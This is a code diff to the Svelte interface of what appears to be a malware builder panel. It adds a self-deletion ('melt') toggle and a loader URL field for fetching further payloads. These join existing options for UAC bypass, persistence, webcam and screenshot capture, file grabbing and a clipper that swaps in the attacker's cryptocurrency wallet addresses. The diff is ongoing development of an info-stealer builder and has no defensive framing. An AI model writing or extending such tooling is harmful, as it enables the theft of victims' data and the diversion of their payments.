@@ -19,6 +19,7 @@
   import GeoBlockSection from "./components/GeoBlockSection.svelte";
   import PumperSection from "./components/PumperSection.svelte";
   import ClipperSection from "./components/ClipperSection.svelte";
+  import LoaderSection from "./components/LoaderSection.svelte";
   import FileGrabberSection from "./components/FileGrabberSection.svelte";
   import PasswordGeneratorDialog from "./components/PasswordGeneratorDialog.svelte";
   import {
@@ -100,6 +101,8 @@
   let persistence = $state(false);
   let uacBypass = $state(false);
   let clipper = $state(false);
+  let melt = $state(true);
+  let loaderUrl = $state("");
   let btcAddress = $state("");
   let ethAddress = $state("");
   let ltcAddress = $state("");
@@ -198,6 +201,10 @@
     clipper = !clipper;
   };
 
+  const toggleMelt = () => {
+    melt = !melt;
+  };
+
   const handleBtcChange = (val: string) => (btcAddress = val);
   const handleEthChange = (val: string) => (ethAddress = val);
   const handleLtcChange = (val: string) => (ltcAddress = val);
@@ -207,6 +214,7 @@
   const handleSolChange = (val: string) => (solAddress = val);
   const handleTrxChange = (val: string) => (trxAddress = val);
   const handleAdaChange = (val: string) => (adaAddress = val);
+  const handleLoaderUrlChange = (val: string) => (loaderUrl = val);
 
   const toggleCountry = (code: string) => {
     if (blockedCountries.includes(code)) {
@@ -367,6 +375,8 @@
                 persistence: persistence,
                 uac_bypass: uacBypass,
                 clipper: clipper,
+                melt: melt,
+                loader_url: loaderUrl,
                 btc_address: btcAddress,
                 eth_address: ethAddress,
                 ltc_address: ltcAddress,
@@ -447,13 +457,17 @@
       persistence={persistence}
       uacBypass={uacBypass}
       clipper={clipper}
+      melt={melt}
       onToggleScreenshots={toggleScreenshots}
       onToggleWebcams={toggleWebcams}
       onToggleClipboard={toggleClipboard}
       onTogglePersistence={togglePersistence}
       onToggleUacBypass={toggleUacBypass}
       onToggleClipper={toggleClipper}
+      onToggleMelt={toggleMelt}
     />
+
+    <LoaderSection {loaderUrl} onLoaderUrlChange={handleLoaderUrlChange} />
 
     {#if clipper}
       <ClipperSection
